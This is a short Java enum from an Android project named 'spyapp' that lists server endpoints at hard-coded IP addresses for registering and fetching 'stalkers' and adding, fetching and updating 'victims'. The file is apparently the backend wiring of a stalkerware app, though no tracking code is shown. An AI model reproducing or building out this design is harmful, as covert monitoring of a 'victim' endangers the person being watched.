package com.example.albert.spyapp;

enum Urls {
    TEST("http://35.204.80.21:4567/test"),
    ADDSTALKER("http://35.204.80.21:4567/stalker/addStalker"),
    GETSTALKER("http://192.168.0.37:4567/stalker/getStalker/"),
    UPDATEVICTIMPARAMS("http://137.117.157.118:4567/victim/updatesParams/:id"),
    ADDVIVTIM("http://137.117.157.118:4567/victim/addVictim"),
    GETVICTIM("http://137.117.157.118:4567/victim/getVictim/:id/:name");

    String url;
    Urls(String address) {
        url=address;
    }
}
